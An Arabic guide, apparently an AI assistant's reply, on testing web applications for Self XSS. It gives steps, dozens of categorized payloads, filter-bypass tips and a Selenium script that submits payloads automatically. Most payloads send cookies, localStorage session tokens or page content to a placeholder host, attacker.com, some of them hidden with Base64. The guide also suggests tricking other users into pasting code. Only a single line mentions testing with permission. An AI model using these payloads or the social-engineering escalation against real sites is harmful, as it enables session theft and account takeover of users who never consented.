
## الخطوات العملية لاختبار ثغرة Self XSS

1. **إعداد البيئة**:
   - استخدم متصفحًا مع أدوات المطورين (F12) لمراقبة وحدة التحكم (Console)، الشبكة (Network)، وتغييرات DOM.
   - أعد خادمًا خارجيًا (مثل خادم Python بسيط أو `ngrok`) لتسجيل البيانات المرسلة من الحقن.
   - (اختياري) استخدم أداة وكيل (مثل **Burp Suite**) لمراقبة طلبات HTTP إذا كانت النقطة تتضمن إرسال بيانات إلى الخادم.
   - تأكد من أن لديك حسابًا في التطبيق لاختبار نقاط إدخال مثل إعدادات الملف الشخصي أو حقول النماذج.

2. **تحديد نقاط الإدخال العرضة**:
   - ابحث عن نقاط إدخال يتحكم بها المستخدم وتُعرض في الصفحة دون تخزين دائم أو تأثير على الآخرين، مثل:
     - حقول تحرير الملف الشخصي (الاسم، الوصف، أو السيرة الذاتية).
     - حقول نماذج تُعرض نتائجها مباشرة في الصفحة (مثل معاينة النص).
     - معلمات URL أو أجزاء منها (مثل `location.hash`) تُعالج في JavaScript.
     - واجهات تحرير المحتوى (مثل محررات النصوص أو الإعدادات).
   - افحص شيفرة JavaScript في الصفحة (عبر أدوات المطورين) لتحديد وظائف مثل `innerHTML`، `eval()`، أو `document.write()` التي تُعالج الإدخالات.
   - تحقق من سياق العرض (HTML، سمات، JavaScript، أو CSS) لتصميم الحقنة المناسبة.

3. **إدخال الحقن**:
   - أدخل شيفرة JavaScript أو HTML ضارة في نقطة الإدخال التي تُعرض في الصفحة.
   - صمم الحقنة لتنفيذ شيفرة عند عرض الإدخال، مثل:
     - `<script>alert('XSS')</script>`
     - `<img src=x onerror="fetch('http://attacker.com/log?c='+document.cookie)">`
     - `<a href="javascript:alert('XSS')">Click</a>`
   - جرب الحقن في سياقات مختلفة:
     - حقل الاسم في الملف الشخصي: أدخل `<script>alert('XSS')</script>`.
     - معاينة نموذج: أدخل `<img src=x onload="alert('XSS')">`.
     - URL: أدخل `https://example.com/#q=<img src=x onerror=alert('XSS')>` إذا كان يُعالج `location.hash`.

4. **مراقبة الاستجابات**:
   - تحقق من تنفيذ الحقنة عبر مراقبة الصفحة أو التفاعل معها:
     - **أدوات المطورين**: راقب وحدة التحكم (Console) للأخطاء أو التنبيهات، والشبكة (Network) للطلبات الصادرة.
     - **خادم خارجي**: تحقق من سجلات الخادم لتأكيد استلام البيانات (مثل ملفات تعريف الارتباط).
     - **تغييرات DOM**: تحقق من تعديل الصفحة أو إعادة التوجيه.
   - **نجاح (True)**: الشيفرة تُنفذ (مثل ظهور تنبيه، إرسال بيانات إلى الخادم، أو تغيير الصفحة).
   - **فشل (False)**: لا يتم التنفيذ بسبب فلاتر، تشفير، أو قيود CSP.
   - سجل النتائج لتحديد الحقن الناجحة.

5. **تجربة أنواع حقن مختلفة**:
   - إذا فشلت الحقنة، جرب أنواعًا أخرى:
     - استخدام وسوم مختلفة: `<script>`، `<img>`، `<svg>`، أو `<div>`.
     - استهداف أحداث مختلفة: `onload`، `onerror`، `onfocus`، أو `onmouseover`.
     - تجاوز الفلاتر: جرب صيغ بديلة مثل `<SCRIPT>` (حروف كبيرة)، تعتيم الشيفرة بـ Base64، أو استخدام أحرف مشفرة.
   - اختبر نقاط إدخال متعددة (مثل حقول أخرى في الملف الشخصي، معاينات النماذج، أو معلمات URL مختلفة).
   - جرب حقنًا تستهدف سياقات مختلفة (مثل حقن داخل سمات، JavaScript، أو CSS).

6. **تأكيد السياق وتقييم التصعيد (اختياري)**:
   - استخدم حقن تكشف سياق التنفيذ (مثل `<img src=x onerror="fetch('http://attacker.com/log?d='+document.domain)">`).
   - قيّم إمكانية تصعيد الثغرة:
     - **هندسة اجتماعية**: إقناع مستخدم آخر بإدخال شيفرة ضارة (مثل إرسال تعليمات عبر بريد إلكتروني).
     - **دمج مع ثغرات أخرى**: تحقق مما إذا كان يمكن استخدام Self XSS مع CSRF أو ثغرات أخرى لتنفيذ إجراءات غير مصرح بها.
     - **تأثير محدود**: لاحظ أن التأثير عادةً يقتصر على المستخدم الذي أدخل الشيفرة.
   - حافظ على التخفي بتجنب التنبيهات البصرية إذا كنت تختبر سياقات حساسة.

---

## جميع المحاولات الممكنة لاختبار ثغرة Self XSS
في اختبار Self XSS، المحاولات تركز على إدخال شيفرات JavaScript أو HTML في نقاط إدخال يتحكم بها المستخدم وتُعرض في متصفحه. سأقسم المحاولات إلى فئتين:
1. **الحقن اليدوية**: للاختبار اليدوي عبر نقاط الإدخال العرضة.
2. **الحقن للأتمتة**: للاستخدام مع سكربتات أو أدوات آلية.

### 1. الحقن اليدوية
تُستخدم هذه الحقن عند اختبار الثغرة يدويًا عبر إدخال شيفرة في حقول النماذج، إعدادات الملف الشخصي، أو معلمات URL. الهدف هو تنفيذ JavaScript في متصفح المستخدم.

#### أ. حقن باستخدام وسوم HTML
{ #XSS_exploit   }
إدراج وسوم HTML تحتوي على JavaScript مباشرة.
- **الحقن**: `<script>alert('XSS')</script>`
  - **الإدخال**: أدخل في حقل الاسم في الملف الشخصي: `<script>alert('XSS')</script>`
  - **كيف يعمل**: ينفذ تنبيهًا عند عرض الاسم.
  - **متى يُستخدم؟**: لتأكيد وجود ثغرة Self XSS.
- **الحقن**: `<script>fetch('http://attacker.com/log?c='+encodeURIComponent(document.cookie))</script>`
  - **الإدخال**: أدخل في حقل وصف الملف الشخصي: `<script>fetch('http://attacker.com/log?c='+encodeURIComponent(document.cookie))</script>`
  - **كيف يعمل**: يرسل ملفات تعريف الارتباط إلى خادم المهاجم.
  - **متى يُستخدم؟**: لاختبار سرقة البيانات.
- **الحقن**: `<script>document.location='http://attacker.com'</script>`
  - **الإدخال**: أدخل في حقل معاينة نموذج: `<script>document.location='http://attacker.com'</script>`
  - **كيف يعمل**: يعيد توجيه المستخدم إلى موقع ضار.
  - **متى يُستخدم؟**: لاختبار إعادة التوجيه.
- **الحقن**: `<script>fetch('http://attacker.com/log', {method: 'POST', body: document.body.innerHTML})</script>`
  - **الإدخال**: أدخل في حقل تحرير النص: `<script>fetch('http://attacker.com/log', {method: 'POST', body: document.body.innerHTML})</script>`
  - **كيف يعمل**: يرسل محتوى الصفحة إلى الخادم.
  - **متى يُستخدم؟**: لاستخراج محتوى DOM.
- **الحقن**: `<script>new Image().src='http://attacker.com/log?s='+encodeURIComponent(localStorage.getItem('token'))</script>`
  - **الإدخال**: أدخل في حقل الإعدادات: `<script>new Image().src='http://attacker.com/log?s='+encodeURIComponent(localStorage.getItem('token'))</script>`
  - **كيف يعمل**: يرسل رمز الجلسة من `localStorage`.
  - **متى يُستخدم؟**: لسرقة بيانات التخزين.

#### ب. حقن باستخدام وسوم صور أو أحداث
{ #XSS_exploit  /  #XSS--ALL--Event--Payload /  #XSS_Idea_for_Img_tag}
استخدام وسوم HTML مع أحداث JavaScript لتنفيذ الشيفرة.
- **الحقن**: `<img src=x onload="alert('XSS')">`
  - **الإدخال**: أدخل في حقل معاينة: `<img src=x onload="alert('XSS')">`
  - **كيف يعمل**: ينفذ تنبيهًا عند تحميل الصورة.
  - **متى يُستخدم؟**: لتأكيد الثغرة تلقائيًا.
- **الحقن**: `<img src=x onerror="fetch('http://attacker.com/log?c='+document.cookie)">`
  - **الإدخال**: أدخل في حقل الاسم: `<img src=x onerror="fetch('http://attacker.com/log?c='+document.cookie)">`
  - **كيف يعمل**: يرسل ملفات تعريف الارتباط عند فشل تحميل الصورة.
  - **متى يُستخدم؟**: لسرقة البيانات تلقائيًا.
- **الحقن**: `<img src=x onmouseover="fetch('http://attacker.com/log?d='+document.domain)">`
  - **الإدخال**: أدخل في حقل وصف الملف الشخصي: `<img src=x onmouseover="fetch('http://attacker.com/log?d='+document.domain)">`
  - **كيف يعمل**: يرسل النطاق عند تمرير المؤشر.
  - **متى يُستخدم؟**: لتتبع التفاعل.
- **الحقن**: `<img src=x onfocus="new Image().src='http://attacker.com/log?s='+localStorage.getItem('token')">`
  - **الإدخال**: أدخل في حقل إعدادات: `<img src=x onfocus="new Image().src='http://attacker.com/log?s='+localStorage.getItem('token')">`
  - **كيف يعمل**: يرسل رمز الجلسة عند التركيز.
  - **متى يُستخدم؟**: لاستهداف أحداث التفاعل.
- **الحقن**: `<img src=x onload="fetch('http://attacker.com/log', {method: 'POST', body: document.body.innerHTML})">`
  - **الإدخال**: أدخل في حقل معاينة نموذج: `<img src=x onload="fetch('http://attacker.com/log', {method: 'POST', body: document.body.innerHTML})">`
  - **كيف يعمل**: يرسل محتوى الصفحة عند تحميل الصورة.
  - **متى يُستخدم؟**: لاستخراج محتوى DOM.

#### ج. حقن باستخدام روابط JavaScript
{ #XSS_exploit /   #ideas_for_url  }
استخدام بروتوكول `javascript:` في روابط أو سمات.
- **الحقن**: `<a href="javascript:alert('XSS')">Click</a>`
  - **الإدخال**: أدخل في حقل وصف الملف الشخصي: `<a href="javascript:alert('XSS')">Click</a>`
  - **كيف يعمل**: ينفذ تنبيهًا عند النقر على الرابط.
  - **متى يُستخدم؟**: لتأكيد الثغرة عند التفاعل.
- **الحقن**: `<a href="javascript:fetch('http://attacker.com/?c='+document.cookie)">Click</a>`
  - **الإدخال**: أدخل في حقل تحرير النص: `<a href="javascript:fetch('http://attacker.com/log?c='+document.cookie)">Click</a>`
  - **كيف يعمل**: يرسل ملفات تعريف الارتباط عند النقر.
  - **متى يُستخدم؟**: لسرقة البيانات عند التفاعل.
- **الحقن**: `<a href="javascript:document.location='http://attacker.com'">Click</a>`
  - **الإدخال**: أدخل في حقل معاينة: `<a href="javascript:document.location='http://attacker.com'">Click</a>`
  - **كيف يعمل**: يعيد توجيه المستخدم عند النقر.
  - **متى يُستخدم؟**: لإعادة التوجيه.
- **الحقن**: `<a href="javascript:new Image().src='http://attacker.com/log?d='+document.domain">Click</a>`
  - **الإدخال**: أدخل في حقل الإعدادات: `<a href="javascript:new Image().src='http://attacker.com/log?d='+document.domain">Click</a>`
  - **كيف يعمل**: يرسل النطاق عند النقر.
  - **متى يُستخدم؟**: لتأكيد سياق التنفيذ.
- **الحقن**: `<a href="javascript:fetch('http://attacker.com/log', {method: 'POST', body: localStorage.getItem('token')})">Click</a>`
  - **الإدخال**: أدخل في حقل وصف الملف الشخصي: `<a href="javascript:fetch('http://attacker.com/log', {method: 'POST', body: localStorage.getItem('token')})">Click</a>`
  - **كيف يعمل**: يرسل رمز الجلسة عند النقر.
  - **متى يُستخدم؟**: لسرقة بيانات التخزين.

#### د. حقن داخل سمات أو JavaScript
{ #XSS_exploit /  #Inline_HTML_Injection}
إدراج شيفرة في سياقات سمات HTML أو JavaScript.
- **الحقن**: `" onfocus="alert('XSS')`
  - **الإدخال**: أدخل في حقل الاسم: `" onfocus="alert('XSS')`
  - **كيف يعمل**: ينفذ تنبيهًا إذا أُدرج في سمة مثل `<input value="...">`.
  - **متى يُستخدم؟**: لاستهداف السمات.
- **الحقن**: `" onload="fetch('http://attacker.com/log?c='+document.cookie)`
  - **الإدخال**: أدخل في حقل معاينة: `" onload="fetch('http://attacker.com/log?c='+document.cookie)`
  - **كيف يعمل**: يرسل ملفات تعريف الارتباط إذا أُدرج في سمة حدث.
  - **متى يُستخدم؟**: لاستهداف أحداث السمات.
- **الحقن**: `";alert('XSS');//`
  - **الإدخال**: أدخل في حقل تحرير النص: `";alert('XSS');//`
  - **كيف يعمل**: ينفذ تنبيهًا إذا أُدرج في سياق JavaScript مثل `<script>var x="...";`.
  - **متى يُستخدم؟**: لاستهداف JavaScript.
- **الحقن**: `";fetch('http://attacker.com/log?c='+document.cookie);//`
  - **الإدخال**: أدخل في حقل الإعدادات: `";fetch('http://attacker.com/log?c='+document.cookie);//`
  - **كيف يعمل**: يرسل ملفات تعريف الارتباط في سياق JavaScript.
  - **متى يُستخدم؟**: لسرقة البيانات في JavaScript.
- **الحقن**: `" onmouseover="new Image().src='http://attacker.com/log?s='+localStorage.getItem('token')`
  - **الإدخال**: أدخل في حقل وصف الملف الشخصي: `" onmouseover="new Image().src='http://attacker.com/log?s='+localStorage.getItem('token')`
  - **كيف يعمل**: يرسل رمز الجلسة عند تمرير المؤشر.
  - **متى يُستخدم؟**: لاستهداف سمات التفاعل.

#### هـ. حقن مع التعتيم
{ #XSS_ecoded_payload  / #XSS_exploit}
استخدام تقنيات التعتيم لتجنب الكشف.
- **الحقن**: `<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>`
  - **الإدخال**: أدخل في حقل الاسم: `<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>`
  - **كيف يعمل**: يفك تشفير Base64 لتنفيذ تنبيه.
  - **متى يُستخدم؟**: لتجاوز فلاتر العميل.
- **الحقن**: `<img src=x onerror="eval(atob('ZmV0Y2goJ2h0dHA6Ly9hdHRhY2tlci5jb20vbG9nP2M9Jytkb2N1bWVudC5jb29raWUp'))">`
  - **الإدخال**: أدخل في حقل معاينة: `<img src=x onerror="eval(atob('ZmV0Y2goJ2h0dHA6Ly9hdHRhY2tlci5jb20vbG9nP2M9Jytkb2N1bWVudC5jb29raWUp'))">`
  - **كيف يعمل**: يفك تشفير Base64 ويرسل ملفات تعريف الارتباط.
  - **متى يُستخدم؟**: لتجنب أنظمة الكشف.
- **الحقن**: `<script>alert(String.fromCharCode(88,83,83))</script>`
  - **الإدخال**: أدخل في حقل وصف الملف الشخصي: `<script>alert(String.fromCharCode(88,83,83))</script>`
  - **كيف يعمل**: ينشئ تنبيهًا باستخدام رموز ASCII.
  - **متى يُستخدم؟**: لتجاوز فلاتر تحظر النصوص المباشرة.
- **الحقن**: `<img src=x onload="setTimeout(() => fetch('http://attacker.com/log?c='+document.cookie), 1000)">`
  - **الإدخال**: أدخل في حقل تحرير النص: `<img src=x onload="setTimeout(() => fetch('http://attacker.com/log?c='+document.cookie), 1000)">`
  - **كيف يعمل**: يؤخر إرسال البيانات لتجنب الكشف.
  - **متى يُستخدم؟**: لتجنب أنظمة المراقبة الفورية.
- **الحقن**: `<script>document['location']='http://attacker.com'</script>`
  - **الإدخال**: أدخل في حقل الإعدادات: `<script>document['location']='http://attacker.com'</script>`
  - **كيف يعمل**: يستخدم صيغة غير قياسية لإعادة التوجيه.
  - **متى يُستخدم؟**: لتجنب فلاتر البحث عن الكلمات.

#### و. حقن تستهدف DOM
{  #XSS_DOM  /  #XSS_exploit }
إدراج شيفرة تُعالج في JavaScript عبر DOM (مشابهة لـ DOM-Based XSS).
- **الحقن**: `<img src=x onerror=alert('XSS')>`
  - **الإدخال**: أدخل في URL: `https://example.com/#q=<img src=x onerror=alert('XSS')>`
  - **كيف يعمل**: ينفذ تنبيهًا إذا عُولج `location.hash` في DOM.
  - **متى يُستخدم؟**: لاستهداف معالجة العميل.
- **الحقن**: `<svg onload=fetch('http://attacker.com/log?c='+document.cookie)>`
  - **الإدخال**: أدخل في URL: `https://example.com/#q=<svg onload=fetch('http://attacker.com/log?c='+document.cookie)>`
  - **كيف يعمل**: يرسل ملفات تعريف الارتباط إذا عُولج في DOM.
  - **متى يُستخدم؟**: لسرقة البيانات.
- **الحقن**: `data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4`
  - **الإدخال**: أدخل في حقل معاينة: `data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4`
  - **كيف يعمل**: ينفذ تنبيهًا عبر HTML مشفر.
  - **متى يُستخدم؟**: لتجاوز فلاتر URL.
- **الحقن**: `javascript:fetch('http://attacker.com/log?c='+document.cookie)`
  - **الإدخال**: أدخل في حقل إعدادات URL: `javascript:fetch('http://attacker.com/log?c='+document.cookie)`
  - **كيف يعمل**: يرسل ملفات تعريف الارتباط إذا أُدرج في سمة `href`.
  - **متى يُستخدم؟**: لاستهداف بروتوكولات JavaScript.
- **الحقن**: `"-fetch('http://attacker.com/log?c='+document.cookie)-"`
  - **الإدخال**: أدخل في URL: `https://example.com/#q="-fetch('http://attacker.com/log?c='+document.cookie)-"`
  - **كيف يعمل**: يرسل ملفات تعريف الارتباط إذا عُولج في تعبير JavaScript.
  - **متى يُستخدم؟**: لاستهداف سياقات JavaScript.

### 2. الحقن للأتمتة
تُستخدم هذه الحقن مع سكربتات (مثل Python مع مكتبة `selenium`) لأتمتة اختبار نقاط إدخال عرضة لـ Self XSS، خاصة تلك التي تتطلب تفاعل المتصفح.

#### أ. إعداد قائمة الحقن
- **المحاولات**:
  - إنشاء قائمة بالحقن التي تستهدف سياقات HTML، سمات، JavaScript، وDOM.
  - مثال قائمة:
    ```
    <script>alert('XSS')</script>
    <img src=x onerror=fetch('http://attacker.com/log?c='+document.cookie)>
    <svg onload=eval(atob('YWxlcnQoJ1hTUycp'))>
    <a href="javascript:fetch('http://attacker.com/log?c='+document.cookie)">Click</a>
    ";fetch('http://attacker.com/log?c='+document.cookie);//
    ```
- **كيف يعمل**:
  - يتم إدخال الحقن في نقاط إدخال (مثل حقول النماذج أو URL).
  - يتم مراقبة المتصفح أو الخادم الخارجي لتأكيد التنفيذ.
- **متى يُستخدم؟**:
  - عند اختبار نقاط إدخال متعددة بسرعة.

#### ب. سكربت أتمتة بسيط
- **السكربت** (مثال بلغة Python مع `selenium` لمحاكاة التفاعل وخادم لتسجيل البيانات):
  ```python
  from http.server import BaseHTTPRequestHandler, HTTPServer
  from selenium import webdriver
  from selenium.webdriver.common.by import By
  import urllib.parse
  import time

  class LogServer(BaseHTTPRequestHandler):
      def do_GET(self):
          self.send_response(200)
          self.end_headers()
          query = urllib.parse.urlparse(self.path).query
          print(f"بيانات مستلمة: {urllib.parse.parse_qs(query)}")

      def do_POST(self):
          self.send_response(200)
          self.end_headers()
          content_length = int(self.headers['Content-Length'])
          post_data = self.rfile.read(content_length).decode()
          print(f"بيانات POST مستلمة: {post_data}")

  payloads = [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=fetch('http://localhost:8000/log?c='+document.cookie)>",
      "<svg onload=eval(atob('YWxlcnQoJ1hTUycp'))>",
      "<a href=\"javascript:fetch('http://localhost:8000/log?c='+document.cookie)\">Click</a>",
      "\";fetch('http://localhost:8000/log?c='+document.cookie);//"
  ]

  driver = webdriver.Chrome()  # تأكد من تثبيت ChromeDriver
  target_url = "https://example.com/profile"
  input_field_id = "name-input"  # استبدل بمعرف حقل الإدخال

  try:
      driver.get(target_url)
      for payload in payloads:
          try:
              input_field = driver.find_element(By.ID, input_field_id)
              input_field.clear()
              input_field.send_keys(payload)
              input_field.submit()
              time.sleep(1)  # انتظر لمعالجة الإدخال
              print(f"تم إرسال: {payload}")
          except:
              print(f"فشل إرسال: {payload}")
  finally:
      driver.quit()

  server = HTTPServer(('localhost', 8000), LogServer)
  print("تشغيل الخادم على http://localhost:8000")
  server.serve_forever()
  ```
- **كيف يعمل**:
  - يُشغل خادمًا محليًا لتسجيل البيانات.
  - يستخدم `selenium` لمحاكاة إدخال الحقن في حقل (مثل حقل الاسم) وتقديمه.
  - يسجل البيانات المستلمة في الخادم عند تنفيذ الحقن.
- **متى يُستخدم؟**:
  - عند الحاجة لاختبار آلي لنقاط إدخال تتطلب تفاعل المتصفح.

#### ج. تحليل الاستجابات
- **المحاولات**:
  - قارن الاستجابات بناءً على:
    - **وحدة التحكم**: تحقق من ظهور تنبيهات أو أخطاء في Console.
    - **طلبات الشبكة**: تحقق من الطلبات المرسلة إلى `http://attacker.com/log`.
    - **تغييرات DOM**: تحقق من إعادة التوجيه أو تعديل الصفحة.
  - مثال: إذا تلقى الخادم `c=sessionid=abc123`، فهذا يؤكد نجاح الحقن.
- **كيف يعمل**:
  - يتم تسجيل الاستجابات لتحديد الحقن الناجحة.
- **متى يُستخدم؟**:
  - لتحديد النقاط القابلة للاستغلال.

#### د. توسيع قائمة الحقن
- **المحاولات**:
  - أضف حقنًا إضافية (مثل `<iframe src="javascript:alert('XSS')">` أو `<div onclick="fetch('http://attacker.com/log?c='+document.cookie)">`).
  - جرب أحداث أخرى (مثل `onblur`، `ontoggle`) أو وسوم أخرى (مثل `<input>`، `<object>`).
  - اختبر سياقات DOM معقدة (مثل `eval(...)` أو `setTimeout(...)`).
- **كيف يعمل**:
  - يتم إنشاء قائمة موسعة تشمل كل المتغيرات الممكنة.
  - مثال: إضافة `<input type=text onfocus="fetch('http://attacker.com/log?c='+document.cookie)">` إلى القائمة.
- **متى يُستخدم؟**:
  - عند الحاجة لتغطية شاملة للسياقات.

---



1. حقن باستخدام وسوم HTML:
- <script>alert('XSS')</script>: ينفذ تنبيهًا عند العرض.
- <script>fetch('http://attacker.com/log?c='+encodeURIComponent(document.cookie))</script>: يرسل ملفات تعريف الارتباط.
- <script>document.location='http://attacker.com'</script>: يعيد توجيه المستخدم.
- <script>fetch('http://attacker.com/log', {method: 'POST', body: document.body.innerHTML})</script>: يرسل محتوى الصفحة.
- <script>new Image().src='http://attacker.com/log?s='+encodeURIComponent(localStorage.getItem('token'))</script>: يرسل رمز الجلسة.

2. حقن باستخدام وسوم صور أو أحداث:
- <img src=x onload="alert('XSS')">: ينفذ تنبيهًا عند تحميل الصورة.
- <img src=x onerror="fetch('http://attacker.com/log?c='+document.cookie)">: يرسل ملفات تعريف الارتباط.
- <img src=x onmouseover="fetch('http://attacker.com/log?d='+document.domain)">: يرسل النطاق عند تمرير المؤشر.
- <img src=x onfocus="new Image().src='http://attacker.com/log?s='+localStorage.getItem('token')">: يرسل رمز الجلسة عند التركيز.
- <img src=x onload="fetch('http://attacker.com/log', {method: 'POST', body: document.body.innerHTML})">: يرسل محتوى الصفحة.

3. حقن باستخدام روابط JavaScript:
- <a href="javascript:alert('XSS')">Click</a>: ينفذ تنبيهًا عند النقر.
- <a href="javascript:fetch('http://attacker.com/log?c='+document.cookie)">Click</a>: يرسل ملفات تعريف الارتباط عند النقر.
- <a href="javascript:document.location='http://attacker.com'">Click</a>: يعيد توجيه المستخدم.
- <a href="javascript:new Image().src='http://attacker.com/log?d='+document.domain">Click</a>: يرسل النطاق.
- <a href="javascript:fetch('http://attacker.com/log', {method: 'POST', body: localStorage.getItem('token')})">Click</a>: يرسل رمز الجلسة.

4. حقن داخل سمات أو JavaScript:
- " onfocus="alert('XSS'): ينفذ تنبيهًا في سمة.
- " onload="fetch('http://attacker.com/log?c='+document.cookie): يرسل ملفات تعريف الارتباط في سمة.
- ";alert('XSS');//: ينفذ تنبيهًا في سياق JavaScript.
- ";fetch('http://attacker.com/log?c='+document.cookie);//: يرسل ملفات تعريف الارتباط في JavaScript.
- " onmouseover="new Image().src='http://attacker.com/log?s='+localStorage.getItem('token'): يرسل رمز الجلسة في سمة.

5. حقن مع التعتيم:
- <script>eval(atob('YWxlcnQoJ1hTUycp'))</script>: يفك تشفير Base64 لتنفيذ تنبيه.
- <img src=x onerror="eval(atob('ZmV0Y2goJ2h0dHA6Ly9hdHRhY2tlci5jb20vbG9nP2M9Jytkb2N1bWVudC5jb29raWUp'))">: يفك تشفير Base64 ويرسل ملفات تعريف الارتباط.
- <script>alert(String.fromCharCode(88,83,83))</script>: يستخدم رموز ASCII.
- <img src=x onload="setTimeout(() => fetch('http://attacker.com/log?c='+document.cookie), 1000)">: يؤخر إرسال البيانات.
- <script>document['location']='http://attacker.com'</script>: يستخدم صيغة غير قياسية.

6. حقن تستهدف DOM:
- <img src=x onerror=alert('XSS')>: ينفذ تنبيهًا في DOM.
- <svg onload=fetch('http://attacker.com/log?c='+document.cookie)>: يرسل ملفات تعريف الارتباط في DOM.
- data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4: ينفذ تنبيهًا عبر HTML مشفر.
- javascript:fetch('http://attacker.com/log?c='+document.cookie): يرسل ملفات تعريف الارتباط عبر بروتوكول.
- "-fetch('http://attacker.com/log?c='+document.cookie)-": يرسل ملفات تعريف الارتباط في تعبير JavaScript.



---

**نصائح إضافية**:
- **اختبار توافق المتصفح**: اختبر الحقن في متصفحات مختلفة (Chrome، Firefox، Safari، Edge) لأن السلوك قد يختلف.
- **إعداد الخادم**: استخدم خادمًا بسيطًا (مثل Python `http.server`) أو `ngrok` لتسجيل البيانات، وتأكد من دعم طلبات GET وPOST.
- **تجاوز الفلاتر**: جرب تغيير حالة الأحرف (مثل `<SCRIPT>`)، استخدام أحداث غير شائعة (مثل `onfocus`)، أو تعتيم الشيفرة بـ Base64 أو ASCII.
- **اختبار نقاط الإدخال**: ركز على حقول الملف الشخصي، معاينات النماذج، ومعلمات URL التي تُعالج في العميل.
- **الأدوات**: استخدم **Selenium** لمحاكاة التفاعل، **Burp Suite** لمراقبة الطلبات، أو **XSStrike** لتوليد الحقن.
- **تقييم التصعيد**: تحقق من إمكانية دمج Self XSS مع هجمات هندسة اجتماعية أو CSRF لزيادة التأثير.
- **القيود**: لاحظ أن Self XSS تؤثر فقط على المستخدم الذي يدخل الشيفرة، وقد تكون محدودة بسبب CSP أو تشفير الإدخال.
- **السلامة**: اختبر فقط بإذن صريح (مثل برامج مكافآت الأخطاء) وتجنب إلحاق الضرر.

إذا كنت تريد شرح خطوة أخرى بنفس الأسلوب (مثل "Test for DOM-Based XSS" أو "Bypassing XSS Filters")، أو التركيز على سياق معين (مثل Self XSS في واجهات تحرير المحتوى)، أخبرني وسأقدم ردًا مخصصًا!